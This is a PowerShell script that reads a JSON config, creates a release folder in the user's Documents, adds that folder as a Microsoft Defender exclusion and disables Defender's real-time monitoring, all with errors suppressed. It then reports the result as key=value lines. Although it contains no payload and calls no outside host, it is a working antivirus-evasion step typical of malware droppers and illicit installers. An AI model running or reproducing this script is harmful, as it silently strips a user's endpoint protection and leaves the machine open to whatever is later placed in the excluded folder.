param(
    [Parameter(Mandatory = $true)]
    [string]$ConfigPath
)

Set-StrictMode -Version 2.0
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Write-Result {
    param([string]$Name, [string]$Value)
    Write-Output ("{0}={1}" -f $Name, $Value)
}

$config = Get-Content -LiteralPath $ConfigPath -Raw | ConvertFrom-Json
$releaseDirName = [string]$config.release_dir_name
$disableDefender = [bool]$config.disable_defender

$documents = [Environment]::GetFolderPath("MyDocuments")
$releasePath = Join-Path $documents $releaseDirName

if ($disableDefender -and (Get-Command Set-MpPreference -ErrorAction SilentlyContinue)) {
    New-Item -ItemType Directory -Path $releasePath -Force | Out-Null

    Add-MpPreference -ExclusionPath $releasePath -ErrorAction SilentlyContinue
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

    $status = Get-MpComputerStatus -ErrorAction SilentlyContinue
    Write-Result -Name "DEFENDER_PREPARED" -Value "true"
    Write-Result -Name "DEFENDER_REALTIME" -Value ([string]$status.RealTimeProtectionEnabled)
    Write-Result -Name "DEFENDER_EXCLUSION" -Value $releasePath
}
else {
    Write-Result -Name "DEFENDER_PREPARED" -Value "false"
    Write-Result -Name "DEFENDER_EXCLUSION" -Value $releasePath
}
